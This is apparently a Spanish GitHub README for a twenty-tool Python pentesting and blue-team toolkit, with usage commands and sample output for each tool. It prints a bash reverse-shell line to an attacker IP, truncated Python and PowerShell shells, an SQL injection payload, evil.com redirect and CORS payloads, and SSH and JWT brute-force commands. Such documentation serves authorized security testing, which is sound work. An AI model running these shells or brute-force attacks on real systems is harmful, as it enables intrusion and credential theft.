<div align="center">

```
 ██████╗██╗   ██╗██████╗ ███████╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝       ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗       ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║
╚██████╗   ██║   ██████╔╝███████╗██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝
                  V O L U M E   2  —  2 0   T O O L S   A D V A N C E D
```

![Python](https://img.shields.io/badge/Python-3.9+-blue?style=for-the-badge&logo=python&logoColor=white)
![Tools](https://img.shields.io/badge/Tools-20-red?style=for-the-badge)
![Category](https://img.shields.io/badge/Red%20Team%20%7C%20Blue%20Team%20%7C%20OSINT-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey?style=for-the-badge&logo=linux)

> **20 herramientas avanzadas de ciberseguridad — Volumen 2.**  
> Port Scanning · JWT Attacks · SQLi · CORS · WHOIS · Log Analysis · Report Generation y más.

</div>

---

## 🗺️ Mapa del Toolkit

```
CYBER TOOLKIT — VOLUME 2
│
├── ⚡ RECONOCIMIENTO
│   ├── 01 · Async Port Scanner       → asyncio ultra-rápido, 65535 puertos
│   ├── 02 · Subdomain Enumerator     → DNS brute-force + crt.sh passive recon
│   ├── 05 · WHOIS & IP Geo OSINT     → Dominio + IP + geolocalización + blacklist
│   └── 11 · Network Mapper           → Descubrir hosts vivos en subnet CIDR
│
├── 🔴 EXPLOTACIÓN / AUDITORÍA WEB
│   ├── 07 · Directory Bruteforcer    → Rutas web ocultas + high-risk paths
│   ├── 13 · Open Redirect Tester     → 18 payloads de redirect bypass
│   ├── 15 · CORS Tester              → Misconfiguration + wildcard + null origin
│   ├── 16 · SQL Injection Tester     → Error/Boolean/Time-based SQLi
│   └── 18 · Reverse Shell Generator  → 20 tipos de payloads + listeners + upgrade
│
├── 🟡 ANÁLISIS DE SEGURIDAD
│   ├── 03 · SSH Brute Forcer         → Credential audit multi-thread
│   ├── 04 · JWT Attacker             → alg:none + brute secret + token forgery
│   ├── 06 · HTTP Header Auditor      → 10 security headers + CSP analysis
│   ├── 09 · Log Analyzer             → Apache/Nginx/Auth threat detection
│   └── 10 · CVE Search               → NVD API + MITRE — buscar por keyword
│
├── 🔵 DEFENSA / BLUE TEAM
│   ├── 08 · ARP Spoof Detector       → ARP poisoning + MITM detection
│   ├── 12 · Password Generator       → Policy-based + profiles + bulk
│   ├── 14 · Metadata Extractor       → EXIF/GPS/PDF/Office OSINT
│   ├── 17 · Secure Coding Analyzer   → Python AST static security analysis
│   └── 19 · Crypto Analyzer          → Hash identify + encoding + entropy
│
└── 📄 REPORTING
    └── 20 · Security Report Generator → HTML/MD professional reports
```

---

## 🚀 Instalación

```bash
git clone https://github.com/kaleth4/cyber-toolkit-v2.git
cd cyber-toolkit-v2
pip install -r requirements.txt
```

---

## 🛠️ Herramientas en detalle

### ⚡ 01 · Async Port Scanner
Ultra-rápido con `asyncio`. Escanea los 65535 puertos con concurrencia masiva.

```bash
# Puertos comunes (velocidad máxima)
python3 01_async_port_scanner.py -t 192.168.1.1 -p common

# Rango personalizado
python3 01_async_port_scanner.py -t 192.168.1.1 -p 1-10000 -c 1000

# Múltiples rangos y exportar
python3 01_async_port_scanner.py -t target.com -p 80,443,8080-8090 -o ports.json
```
```
[OPEN]     22  SSH                
[OPEN]     80  HTTP               
[OPEN]   6379  Redis         [RISKY]
[OPEN]  27017  MongoDB       [RISKY]

[✓] Abiertos: 4/65535 en 8.3s (7,907 ports/s)
```

---

### 🌐 02 · Subdomain Enumerator
Passive recon via `crt.sh` + brute-force DNS con wordlist interna o custom.

```bash
# Pasivo (crt.sh) + activo (wordlist interna)
python3 02_subdomain_enum.py -d example.com

# Con wordlist custom + HTTP probe
python3 02_subdomain_enum.py -d example.com -w subdomains.txt --probe -o subs.json

# Solo pasivo sin brute
python3 02_subdomain_enum.py -d example.com --no-brute
```
```
[crt.sh]  api.example.com          ['93.184.216.34']   🌐
[FOUND]   mail.example.com         ['93.184.216.35']
[FOUND]   dev.example.com          ['10.0.0.5']
          Title: Development Portal
```

---

### 🔑 03 · SSH Brute Forcer
Credential testing multi-thread con `paramiko`. Banner grabbing + rate limiting.

```bash
# Usuario único
python3 03_ssh_brute.py -t 192.168.1.1 -u root -w rockyou.txt --threads 8

# Lista de usuarios
python3 03_ssh_brute.py -t 192.168.1.1 -U users.txt -w passwords.txt --delay 0.5
```
```
Banner: SSH-2.0-OpenSSH_7.4
[1247] Probando: admin:password123

╔══════════════════════════════╗
║ ✓  CREDENCIAL ENCONTRADA!   ║
║    User: admin               ║
║    Pass: password123         ║
╚══════════════════════════════╝
```

---

### 🔓 04 · JWT Attacker
Decode + alg:none attack + brute-force de secreto + token forgery.

```bash
# Analizar token
python3 04_jwt_attacker.py -t "eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.xxx"

# Ataque alg:none
python3 04_jwt_attacker.py -t TOKEN --none-attack

# Brute-force secreto + forjar admin
python3 04_jwt_attacker.py -t TOKEN --brute -w jwt_secrets.txt --forge admin true
```
```
[CRÍTICO] alg=none — token aceptado sin firma
[ALTO]    Campo sensible: 'admin' modificable si firma débil

[✓] SECRETO ENCONTRADO: 'secret'

[FORGED TOKEN — admin=true]
eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.SIGNATURE
```

---

### 🌍 05 · WHOIS & IP Geo OSINT
WHOIS raw + DNS records + geolocalización + reverse DNS + blacklists.

```bash
python3 05_whois_geo.py -t example.com
python3 05_whois_geo.py -t 8.8.8.8 --blacklist -o report.json
```
```
═══ WHOIS ═══
registrar    : GoDaddy.com, LLC
registered   : 1995-08-14
name_servers : ns1.example.com

═══ GEOLOCALIZACIÓN ═══
País         : Colombia
Ciudad       : Bogotá
ISP          : ETB
```

---

### 📋 06 · HTTP Header Security Auditor
Audita 10 security headers + CSP analysis + info disclosure + cookies.

```bash
python3 06_http_header_auditor.py -t https://example.com
python3 06_http_header_auditor.py -f urls.txt -o report.json
```
```
Grade: C

Headers Faltantes:
  [CRÍTICO] Strict-Transport-Security → max-age=31536000; includeSubDomains
  [ALTO]    Content-Security-Policy   → default-src 'self'

Information Disclosure:
  ⚠ X-Powered-By: PHP/7.4.3   ← versión expuesta
  ⚠ Server: Apache/2.4.29      ← software expuesto
```

---

### 📂 07 · Directory Bruteforcer
Descubre rutas web ocultas con 70+ paths de alto riesgo integrados.

```bash
python3 07_dir_bruteforcer.py -u https://target.com
python3 07_dir_bruteforcer.py -u https://target.com -w dirbuster.txt -x php,html -t 30
```
```
[200] /admin              12847B  Admin Panel
[200] /.env                  847B  ← CRÍTICO
[200] /.git/               3201B  ← CRÍTICO
[403] /backup/                 0B
[301] /api/v1             →  /api/v1/

[!] Rutas de alto riesgo:
    https://target.com/.env
    https://target.com/.git/
```

---

### 🔺 08 · ARP Spoof Detector
Detecta ARP poisoning / ataques MITM en red local. Modo monitoreo continuo.

```bash
# Análisis puntual
python3 08_arp_spoof_detector.py

# Monitoreo continuo (alerta si cambia algún MAC)
python3 08_arp_spoof_detector.py --monitor -i 15 -o alerts.json
```
```
192.168.1.1    aa:bb:cc:dd:ee:01
192.168.1.50   ff:ee:dd:cc:bb:aa

[CRÍTICO] Misma IP 192.168.1.1 tiene múltiples MACs
          → ARP spoofing confirmado — IP disputada
[CRÍTICO] Gateway tiene múltiples MACs → MITM total
```

---

### 📋 09 · Log Analyzer
Analiza logs Apache/Nginx/Auth en busca de SQLi, XSS, brute force, scanners.

```bash
python3 09_log_analyzer.py -f /var/log/nginx/access.log -o report.json
python3 09_log_analyzer.py -f /var/log/auth.log --type auth
```
```
Amenazas (47):
  [CRÍTICO] SQL_INJECTION: 12 eventos
  [CRÍTICO] SHELL_UPLOAD: 3 eventos
  [ALTO]    SCANNER: 8 eventos (sqlmap, nikto)

Brute Force IPs:
  45.33.32.156: 847 errores 401/403
```

---

### 🐛 10 · CVE Search
Consulta la API de NVD en tiempo real. Busca por keyword, CVE ID o severidad.

```bash
# Buscar CVEs de Log4j
python3 10_cve_search.py -k "Apache Log4j" -s CRITICAL -n 10

# CVE específico
python3 10_cve_search.py -c CVE-2021-44228

# CVEs de 2024 HIGH
python3 10_cve_search.py -k "nginx" -s HIGH -y 2024 -o nvd_results.json
```
```
CVE-2021-44228  [CRITICAL 10.0]  2021-12-10
  Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features...
  Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  CWE: CWE-917
```

---

### 🗺️ 11 · Network Mapper
Descubre hosts vivos en un subnet CIDR con ping + TCP probe + reverse DNS.

```bash
python3 11_network_mapper.py -n 192.168.1.0/24
python3 11_network_mapper.py -n 10.0.0.0/16 -w 100 -o hosts.json
```
```
[UP] 192.168.1.1     router.local            aa:bb:cc:dd:ee:01
[UP] 192.168.1.10    workstation.local       ff:ee:dd:cc:bb:aa
[UP] 192.168.1.50    db-server.internal      11:22:33:44:55:66

[✓] Hosts activos: 3/254 en 12.3s
```

---

### 🔐 12 · Password Generator
Generación policy-based con perfiles (web, admin, api, wifi, max) + bulk.

```bash
# Perfil admin (24 chars, todos los tipos)
python3 12_password_generator.py password --profile admin -n 5

# Passphrases memorables
python3 12_password_generator.py passphrase -w 5 -n 3

# Bulk generation
python3 12_password_generator.py bulk -n 1000 -l 20 --profile api -o passwords.txt
```
```
[01] K#9mPxR@vL2!qN&w   [A] 96.4 bits — 2.5e+17 años
[02] j$7Yz!sQ4#Mv8@Lp   [A] 94.1 bits — 8.2e+16 años

[01] Thunder-Castle-Dragon-Storm2847
[02] Ocean-Purple-Blade-Shield1203
```

---

### 🔀 13 · Open Redirect Tester
Prueba 14 payloads de redirect bypass en todos los parámetros comunes.

```bash
python3 13_open_redirect_tester.py -u https://target.com/login --discover
python3 13_open_redirect_tester.py -u https://target.com -p redirect -o vulns.json
```
```
[VULNERABLE] Origin: //evil.com
  Param   : redirect
  Location: //evil.com
```

---

### 🔍 14 · Metadata Extractor
Extrae EXIF, GPS, autor, editor, fechas de imágenes, PDFs y archivos Office.

```bash
python3 14_metadata_extractor.py -f photo.jpg
python3 14_metadata_extractor.py -d ./documents/ -o metadata.json
```
```
═══ EXIF Data ═══
Make                   : Apple
Model                  : iPhone 14 Pro
DateTime               : 2024:01:15 14:23:11

═══ GPS Data (PRIVACIDAD) ═══
GPSLatitude            : (4, 35, 54.6)   ← Coordenadas reales
GPSLongitude           : (74, 4, 26.4)   ← ¡Datos sensibles!
```

---

### 🌐 15 · CORS Tester
Detecta CORS misconfiguration: wildcard, null origin, credentials leak.

```bash
python3 15_cors_tester.py -u https://api.target.com -o cors.json
```
```
[VULNERABLE] https://evil.com
  ⚠ Origen malicioso reflejado
  ⚠ Credentials=true + origen reflejado = CSRF via CORS
  ACAO: https://evil.com  ACAC: true
```

---

### 💉 16 · SQL Injection Tester
Error-based + Boolean-based + Time-based SQLi en parámetros GET.

```bash
python3 16_sqli_tester.py -u http://testphp.vulnweb.com/artists.php -p artist
python3 16_sqli_tester.py -u http://target.com --params id,user,name -o sqli.json
```
```
[*] Testeando param: id
[CRÍTICO] Error-based SQLi en 'id' — DB: MySQL
          Payload: ' OR '1'='1
```

---

### 🛡️ 17 · Secure Coding Analyzer
Análisis estático AST de Python: eval(), pickle, shell=True, secretos hardcoded.

```bash
python3 17_secure_coding_analyzer.py -f app.py
python3 17_secure_coding_analyzer.py -d ./src/ -o sast.json
```
```
  [CRÍTICO] Line  45  eval() puede ejecutar código arbitrario
  [CRÍTICO] Line  89  pickle.loads — deserialización insegura
  [CRÍTICO] Line 112  Posible secreto hardcodeado: password = "admin123"
  [ALTO]    Line  67  os.system() — usar subprocess con lista de args
  [MEDIO]   Line 201  MD5 criptográficamente roto — usar SHA-256+
```

---

### 💻 18 · Reverse Shell Generator
20 tipos de reverse shells (Bash, Python, PHP, Perl, Ruby, PowerShell, Go...).

```bash
# Todos los payloads
python3 18_reverse_shell_gen.py -i 10.10.14.5 -p 4444

# Tipo específico + listener
python3 18_reverse_shell_gen.py -i 10.10.14.5 -p 4444 -t "Python 3" --listener

# Con instrucciones de upgrade
python3 18_reverse_shell_gen.py -i 10.10.14.5 -p 4444 --upgrade
```
```
[Bash TCP]
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

[Python 3]
python3 -c 'import socket,subprocess,os;s=socket.socket()...'

[PowerShell Base64]
powershell -enc JABjAGwAaQBlAG4AdA...
```

---

### 🔐 19 · Crypto Analyzer
Identifica hashes, encodings, entropía y analiza uso crypto en código Python.

```bash
# Identificar hash/encoding
python3 19_crypto_analyzer.py detect "5f4dcc3b5aa765d61d8327deb882cf99"

# Analizar código
python3 19_crypto_analyzer.py code -f app.py

# Calcular entropía
python3 19_crypto_analyzer.py entropy "SGVsbG8gV29ybGQ="
```
```
Posibles hashes:
  [CRÍTICO] MD5
  [CRÍTICO] NTLM
Encodings detectados:
  Base64: decoded → 48656c6c6f20576f726c64

Entropía: 4.875 bits
```

---

### 📄 20 · Security Report Generator
Agrega findings de múltiples JSON en reporte HTML profesional dark-mode.

```bash
# Demo con datos sintéticos
python3 20_security_report_gen.py --demo -t "Mi App" -o report.html

# Con resultados reales de otras herramientas
python3 20_security_report_gen.py -d ./results/ -t "target.com" --format both

# Inputs específicos
python3 20_security_report_gen.py -i sqli.json cors.json headers.json -o final_report.html
```

Genera reporte dark-mode con:
- Executive Summary con conteos por severidad
- Findings ordenados por criticidad con badge de color
- Sección de resultados por herramienta con grade (A–F)
- Export HTML + Markdown

---

## 📦 Dependencias

```bash
pip install -r requirements.txt
```

| Librería | Herramientas |
|----------|-------------|
| `colorama` | Todas |
| `requests` | 02,05,06,07,10,13,15,16,18 |
| `paramiko` | 03 (SSH) |
| `dnspython` | 02,05 |
| `cryptography` | (opcional) |
| `Pillow` | 14 (EXIF) |

---

## 📁 Estructura

```
cyber-toolkit-v2/
├── 01_async_port_scanner.py
├── 02_subdomain_enum.py
├── 03_ssh_brute.py
├── 04_jwt_attacker.py
├── 05_whois_geo.py
├── 06_http_header_auditor.py
├── 07_dir_bruteforcer.py
├── 08_arp_spoof_detector.py
├── 09_log_analyzer.py
├── 10_cve_search.py
├── 11_network_mapper.py
├── 12_password_generator.py
├── 13_open_redirect_tester.py
├── 14_metadata_extractor.py
├── 15_cors_tester.py
├── 16_sqli_tester.py
├── 17_secure_coding_analyzer.py
├── 18_reverse_shell_gen.py
├── 19_crypto_analyzer.py
├── 20_security_report_gen.py
└── requirements.txt
```

---

## 🔗 Flujo de trabajo completo

```
1. Reconocimiento
   01_async_port_scanner → 02_subdomain_enum → 05_whois_geo → 11_network_mapper

2. Enumeración
   07_dir_bruteforcer → 06_http_header_auditor → 14_metadata_extractor

3. Explotación (autorizada)
   04_jwt_attacker → 13_open_redirect_tester → 15_cors_tester → 16_sqli_tester

4. Análisis
   09_log_analyzer → 10_cve_search → 17_secure_coding_analyzer → 19_crypto_analyzer

5. Reporte
   20_security_report_gen → HTML/Markdown profesional
```

---

## ⚠️ Disclaimer

> Uso estrictamente educativo y en entornos propios o autorizados.  
> El autor no se responsabiliza por uso indebido. Actúa siempre dentro del marco legal.

---

<div align="center">

**Kaled Corcho** — [github.com/kaleth4](https://github.com/kaleth4)  
`Cybersecurity Analyst Jr.` · `Red Team` · `Blue Team` · `Python Security`

⭐ Vol.1 también disponible en el perfil

</div>
